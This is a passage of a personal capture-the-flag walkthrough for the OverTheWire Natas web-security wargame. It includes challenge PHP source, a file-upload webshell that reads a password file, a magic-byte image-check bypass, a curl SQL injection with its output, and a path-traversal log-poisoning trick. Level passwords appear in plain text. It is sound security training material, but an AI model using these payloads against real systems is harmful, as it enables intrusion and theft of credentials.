<? } ?> 
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div> 
</div> 
</body> 
</html> 
```

Time for a Path Traversal attack c: 
https://www.owasp.org/index.php/Path_Traversal

after a long amount of trouble I figured out that this was not the way to go, so I switched to just uploading a .php file.

```
<?php
$myfile = fopen("/etc/natas_webpass/natas13", "r") or die("Unable to open file!");
echo fread($myfile,filesize("/etc/natas_webpass/natas13"));
fclose($myfile);
?>
```


## level 13

addres:   http://natas13.natas.labs.overthewire.org/
username: natas13
password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

nother php

```php
<html> 
<head> 
<!-- This stuff in the header has nothing to do with the level --> 
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" /> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" /> 
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script> 
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script> 
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script> 
<script>var wechallinfo = { "level": "natas13", "pass": "<censored>" };</script></head> 
<body> 
<h1>natas13</h1> 
<div id="content"> 
For security reasons, we now only accept image files!<br/><br/> 

<?  

function genRandomString() { 
    $length = 10; 
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz"; 
    $string = "";     

    for ($p = 0; $p < $length; $p++) { 
        $string .= $characters[mt_rand(0, strlen($characters)-1)]; 
    } 

    return $string; 
} 

function makeRandomPath($dir, $ext) { 
    do { 
    $path = $dir."/".genRandomString().".".$ext; 
    } while(file_exists($path)); 
    return $path; 
} 

function makeRandomPathFromFilename($dir, $fn) { 
    $ext = pathinfo($fn, PATHINFO_EXTENSION); 
    return makeRandomPath($dir, $ext); 
} 

if(array_key_exists("filename", $_POST)) { 
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]); 
     
    $err=$_FILES['uploadedfile']['error']; 
    if($err){ 
        if($err === 2){ 
            echo "The uploaded file exceeds MAX_FILE_SIZE"; 
        } else{ 
            echo "Something went wrong :/"; 
        } 
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { 
        echo "File is too big"; 
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) { 
        echo "File is not an image"; 
    } else { 
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { 
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded"; 
        } else{ 
            echo "There was an error uploading the file, please try again!"; 
        } 
    } 
} else { 
?> 

<form enctype="multipart/form-data" action="index.php" method="POST"> 
<input type="hidden" name="MAX_FILE_SIZE" value="1000" /> 
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" /> 
Choose a JPEG to upload (max 1KB):<br/> 
<input name="uploadedfile" type="file" /><br /> 
<input type="submit" value="Upload File" /> 
</form> 
<? } ?> 
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div> 
</div> 
</body> 
</html> 
```

ok nice, PHP docs tell me the function they use just read the first byte or so, so I just copy that off a png file using $ head -n 2 > file.php and append my script to that $ cat myscript.php >> file.php
same exploit works smoothly now

�PNG  Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

## level 14

addres:   http://natas14.natas.labs.overthewire.org/
username: natas14
password: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

we have arrived at SQL injection, fun times c:
```
<html> 
<head> 
<!-- This stuff in the header has nothing to do with the level --> 
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" /> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" /> 
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script> 
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script> 
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script> 
<script>var wechallinfo = { "level": "natas14", "pass": "<censored>" };</script></head> 
<body> 
<h1>natas14</h1> 
<div id="content"> 
<? 
if(array_key_exists("username", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas14', '<censored>'); 
    mysql_select_db('natas14', $link); 
     
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\""; 
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 

    if(mysql_num_rows(mysql_query($query, $link)) > 0) { 
            echo "Successful login! The password for natas15 is <censored><br>"; 
    } else { 
            echo "Access denied!<br>"; 
    } 
    mysql_close($link); 
} else { 
?> 

<form action="index.php" method="POST"> 
Username: <input name="username"><br> 
Password: <input name="password"><br> 
<input type="submit" value="Login" /> 
</form> 
<? } ?> 
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div> 
</div> 
</body> 
</html> 
```

so for some reason my regular one was not accepted, seems that it ate the commenting out trick, thus we just work till the format works

```
❯ curl http://natas14.natas.labs.overthewire.org/index.php\?debug\=true -u natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 -v -d "username=admin\" OR 1=1 OR username=\"admin&password=."
*   Trying 176.9.9.172...
* TCP_NODELAY set
* Connected to natas14.natas.labs.overthewire.org (176.9.9.172) port 80 (#0)
* Server auth using Basic with user 'natas14'
> POST /index.php?debug=true HTTP/1.1
> Host: natas14.natas.labs.overthewire.org
> Authorization: Basic bmF0YXMxNDpMZzk2TTEwVGRmYVB5VkJrSmRqeW1ibGxRNUw2cWRsMQ==
> User-Agent: curl/7.58.0
> Accept: */*
> Content-Length: 52
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 52 out of 52 bytes
< HTTP/1.1 200 OK
< Date: Sat, 03 Nov 2018 17:44:24 GMT
< Server: Apache/2.4.10 (Debian)
< Vary: Accept-Encoding
< Content-Length: 1098
< Content-Type: text/html; charset=UTF-8
< 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas14", "pass": "Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1" };</script></head>
<body>
<h1>natas14</h1>
<div id="content">
Executing query: SELECT * from users where username="admin" OR 1=1 OR username="admin" and password="."<br>Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
* Connection #0 to host natas14.natas.labs.overthewire.org left intact
```
                                                                         
AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J


## level 15

addres:   http://natas15.natas.labs.overthewire.org/
username: natas15
password: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

nother SQL injection it seems.

```
<body> 
<h1>natas15</h1> 
<div id="content"> 
<? 

/* 
CREATE TABLE `users` ( 
  `username` varchar(64) DEFAULT NULL, 
  `password` varchar(64) DEFAULT NULL 
); 
*/ 

if(array_key_exists("username", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas15', '<censored>'); 
    mysql_select_db('natas15', $link); 
     
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; 
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 

    $res = mysql_query($query, $link); 
    if($res) { 
    if(mysql_num_rows($res) > 0) { 
        echo "This user exists.<br>"; 
    } else { 
        echo "This user doesn't exist.<br>"; 
    } 
    } else { 
        echo "Error in query.<br>"; 
    } 

    mysql_close($link); 
} else { 
?> 

<form action="index.php" method="POST"> 
Username: <input name="username"><br> 
<input type="submit" value="Check existence" /> 
</form> 
<? } ?> 
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div> 
</div> 
</body> 
```

wrote a script, was annoying, see files.

## level 16

addres:   http://natas16.natas.labs.overthewire.org/
username: natas16
password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

more sql injection 

```php
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas16", "pass": "<censored>" };</script></head>
<body>
<h1>natas16</h1>
<div id="content">

For security reasons, we now filter even more on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

wrrote another bruteforcer

## level 17

addres:   http://natas17.natas.labs.overthewire.org/
username: natas17
password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

```
<? 

/* 
CREATE TABLE `users` ( 
  `username` varchar(64) DEFAULT NULL, 
  `password` varchar(64) DEFAULT NULL 
); 
*/ 

if(array_key_exists("username", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas17', '<censored>'); 
    mysql_select_db('natas17', $link); 
     
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; 
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 

    $res = mysql_query($query, $link); 
    if($res) { 
    if(mysql_num_rows($res) > 0) { 
        //echo "This user exists.<br>"; 
    } else { 
        //echo "This user doesn't exist.<br>"; 
    } 
    } else { 
        //echo "Error in query.<br>"; 
    } 

    mysql_close($link); 
} else { 
?> 

<form action="index.php" method="POST"> 
Username: <input name="username"><br> 
<input type="submit" value="Check existence" /> 
</form> 
<? } ?> 
```

## level 18

addres:   http://natas18.natas.labs.overthewire.org/
username: natas18
password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

very simple brute force, I was heavily overthinking this one

## level 19

addres:   http://natas19.natas.labs.overthewire.org/
username: natas19
password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs

same shit but wit hhex

## level 20

addres:   http://natas20.natas.labs.overthewire.org/
username: natas20
password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF

easy

## level 21

addres:   http://natas21.natas.labs.overthewire.org/
Username: natas21
Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ

again solved with simple script

## level 22

addres:   http://natas22.natas.labs.overthewire.org/
Username: natas22
Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ

make get request with parameters and ignore the redirect, thats it pretty much

## level 23

addres:   http://natas23.natas.labs.overthewire.org/
Username: natas23
Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE

password has to be over 10 and contain I love you, a sting "1111iloveyou" would work.

## level 24

addres:   http://natas24.natas.labs.overthewire.org/
Username: natas24
Password: OsRmXFguozKpTZZ5X14zNO43379LZveg

strcmp will return zero on error, it errors if you feed it an array

## level 25

addres:   http://natas25.natas.labs.overthewire.org/
Username: natas25
Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c

see script, had to make a request that got around their anti-path transeral thing by abusing their logger

Had to write a php snippet that read out hte password in the useragent so it would be in a .log file that I could access using their lang field in the request, got around the file transferral by simple adding moar dots, they check for "../" so we put in ".../...//", which they change to "../"

## level 26

addres:   http://natas26.natas.labs.overthewire.org/
Username: natas26
Password: oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T

## level 27

addres:   http://natas27.natas.labs.overthewire.org/
Username: natas27
Password: oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T 

## notes

2018-11-3:
I'm using chromium-browser on ubuntu to play this.

